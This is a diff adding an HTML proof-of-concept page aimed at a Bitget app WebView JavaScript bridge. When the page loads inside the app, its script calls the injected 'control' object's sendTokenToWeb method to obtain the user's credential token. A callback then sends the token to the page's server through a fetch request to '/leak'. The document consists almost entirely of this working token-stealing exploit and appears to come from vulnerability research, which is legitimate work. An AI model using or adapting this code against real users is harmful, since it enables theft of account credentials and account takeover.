@@ -1,0 +1,28 @@
+<!DOCTYPE html><html><head><title>Bitget JSBridge PoC</title></head>
+<body>
+<h2>Bitget WebView JSBridge PoC</h2>
+<pre id="out">running...</pre>
+<script>
+function log(s){document.getElementById('out').textContent += "\n" + s;}
+window.leaked = {};
+function pocCallback(data){
+  window.leaked = data;
+  log("LEAK RECEIVED: " + JSON.stringify(data));
+  // exfil to server log via fetch
+  fetch('/leak?d=' + encodeURIComponent(JSON.stringify(data)));
+}
+if (window.control) {
+  log("control object present");
+  try {
+    // LEVEL_NONE API test - should always pass filter
+    if (control.metaTitle) { control.metaTitle('poc-title'); log("metaTitle called"); }
+    // sendTokenToWeb - the credential leak (levelMiddle)
+    control.sendTokenToWeb('pocCallback');
+    log("sendTokenToWeb called");
+  } catch(e){ log("err: " + e); }
+} else {
+  log("NO control object - JSBridge not injected");
+}
+log("done");
+</script>
+</body></html>
